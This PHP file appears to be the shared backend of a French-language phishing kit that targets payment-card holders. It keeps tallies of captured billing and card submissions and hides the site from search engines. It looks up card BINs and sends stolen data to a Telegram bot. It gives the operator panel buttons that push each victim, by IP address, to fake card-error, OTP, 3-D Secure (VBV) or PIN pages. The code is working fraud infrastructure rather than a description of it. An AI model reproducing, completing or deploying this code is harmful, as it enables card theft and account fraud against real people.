<?php
// =================================================================================
// INITIALISATION PRIORITAIRE - NE RIEN METTRE AVANT
// =================================================================================

// 1. Buffer de sortie EN PREMIER (capture toutes les sorties)
ob_start();

// 2. Headers HTTP AVANT la session
if (!headers_sent()) {
    header('X-Robots-Tag: noindex, nofollow, noarchive, nosnippet');
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: DENY');
    header('X-XSS-Protection: 1; mode=block');
    header('Referrer-Policy: no-referrer');
}

// 3. Session sécurisée
if (session_status() == PHP_SESSION_NONE) {
    ini_set('session.cookie_httponly', 1);
    ini_set('session.use_only_cookies', 1);
    ini_set('session.cookie_secure', isset($_SERVER['HTTPS']));
    ini_set('session.cookie_samesite', 'Strict');
    ini_set('session.gc_maxlifetime', 1800);
    session_start();
}

// =================================================================================
// SYSTÈME DE REPRISE DE SESSION
// =================================================================================

function saveUserProgress($step, $data = []) {
    $_SESSION['user_progress'] = [
        'step' => $step,
        'data' => $data,
        'timestamp' => time(),
        'ip' => $_SERVER['REMOTE_ADDR']
    ];
}

function getUserProgress() {
    if (isset($_SESSION['user_progress'])) {
        $progress = $_SESSION['user_progress'];
        
        if (time() - $progress['timestamp'] > 7200) {
            unset($_SESSION['user_progress']);
            return null;
        }
        
        if ($progress['ip'] !== $_SERVER['REMOTE_ADDR']) {
            unset($_SESSION['user_progress']);
            return null;
        }
        
        return $progress;
    }
    return null;
}

function clearUserProgress() {
    unset($_SESSION['user_progress']);
}

// =================================================================================
// CHARGEMENT CONFIGURATION
// =================================================================================

$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$configContent = @file_get_contents($configFile);

if ($configContent === false) {
    $config = [
        'statistiques' => ['click' => 0, 'billing' => 0, 'cc' => 0, 'other' => 0],
        'settings' => ['panel' => '0', 'password' => '', 'autoredirect' => '15', 'movement_track' => '1', 'captcha' => '1'],
        'sending' => ['telegram' => ['token' => '', 'chatid' => '', 'chatidbilling' => '', 'chatidcc' => '', 'chatidclick' => ''], 'email' => ''],
        'exceptions' => ['banned' => '', 'whitelist' => '']
    ];
} else {
    $config = json_decode($configContent, true);
    if (!is_array($config)) {
        $config = [
            'statistiques' => ['click' => 0, 'billing' => 0, 'cc' => 0, 'other' => 0],
            'settings' => ['panel' => '0', 'password' => '', 'autoredirect' => '15', 'movement_track' => '1', 'captcha' => '1'],
            'sending' => ['telegram' => ['token' => '', 'chatid' => '', 'chatidbilling' => '', 'chatidcc' => '', 'chatidclick' => ''], 'email' => ''],
            'exceptions' => ['banned' => '', 'whitelist' => '']
        ];
    }
}

// Variables de configuration avec valeurs par défaut
$click = $config['statistiques']['click'] ?? 0;
$billing = $config['statistiques']['billing'] ?? 0;
$cc = $config['statistiques']['cc'] ?? 0;
$other = $config['statistiques']['other'] ?? 0;

$panel = $config['settings']['panel'] ?? '0';
$password = $config['settings']['password'] ?? '';
$autoredirect = $config['settings']['autoredirect'] ?? '15';
$movement_track = $config['settings']['movement_track'] ?? '1';
$captcha = $config['settings']['captcha'] ?? '1';

$token = $config['sending']['telegram']['token'] ?? '';
$chatid = $config['sending']['telegram']['chatid'] ?? '';
$chatidbilling = $config['sending']['telegram']['chatidbilling'] ?? '';
$chatidcc = $config['sending']['telegram']['chatidcc'] ?? '';
$chatidclick = $config['sending']['telegram']['chatidclick'] ?? '';
$email = $config['sending']['email'] ?? '';

$banned = $config['exceptions']['banned'] ?? '';
$whitelist = $config['exceptions']['whitelist'] ?? '';

// =================================================================================
// FONCTIONS UTILITAIRES
// =================================================================================

function update($name) {
    $configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
    $jsonString = @file_get_contents($configFile);
    
    if ($jsonString === false) {
        return false;
    }
    
    $data = json_decode($jsonString, true);
    
    if (!$data || !isset($data["statistiques"][$name])) {
        return false;
    }
    
    $data["statistiques"][$name] = (int)$data["statistiques"][$name] + 1;
    $newJsonString = json_encode($data, JSON_PRETTY_PRINT);
    
    return @file_put_contents($configFile, $newJsonString);
}

function getBin($bin) {
    $url = "https://data.handyapi.com/bin/" . $bin;

    $curl = curl_init();
    curl_setopt_array($curl, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false
    ));
    $response = @curl_exec($curl);
    curl_close($curl);

    return $response;
}

function getData($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = @curl_exec($ch);
    curl_close($ch);
    return $response;
}

function sendMessage($message, $panel, $chatid) {
    global $token;
    
    if (empty($token) || empty($chatid)) {
        return false;
    }
    
    $query_params = array(
        'text' => $message,
        'chat_id' => $chatid
    );

    if ($panel) {
        $webhookUrl = "https://api.telegram.org/bot$token/setWebhook?url=https://" . $_SERVER['SERVER_NAME'] . "/help/action/utils.php";
        getData($webhookUrl);

        $reply_markup = array(
            'inline_keyboard' => array(
                array(
                    array(
                        'text' => '❌ ERREUR C❌',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-cc"
                    )
                ),
                array(
                    array(
                        'text' => '🫧 O ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-otp"
                    ),
                    array(
                        'text' => '☄️ V',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-vbv"
                    )
                ),
                array(
                    array(
                        'text' => '💦 N ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-pin"
                    ),
                    array(
                        'text' => '↪️ al ',
                        'callback_data' => $_SERVER['REMOTE_ADDR'] . "-final"
                    )
                )
            )
        );
        $query_params['reply_markup'] = json_encode($reply_markup);
    }

    $query_url = "https://api.telegram.org/bot$token/sendMessage";

    $curl = curl_init($query_url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($query_params));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    $result = @curl_exec($curl);
    curl_close($curl);

    return $result;
}

function change($name, $text) {
    $paths = [
        'vbv.json',
        '../help/!#/vbv.json',
        '../../help/!#/vbv.json'
    ];
    
    foreach ($paths as $path) {
        $jsonString = @file_get_contents($path);
        if ($jsonString !== false) {
            $data = json_decode($jsonString, true);
            if (is_array($data)) {
                $data[$name] = $text;
                $newJsonString = json_encode($data, JSON_PRETTY_PRINT);
                @file_put_contents($path, $newJsonString);
                return true;
            }
        }
    }
    return false;
}

// =================================================================================
// GESTION DE LA PROGRESSION UTILISATEUR
// =================================================================================

$userProgress = getUserProgress();
if ($userProgress) {
    $currentStep = $userProgress['step'];
    $savedData = $userProgress['data'];
}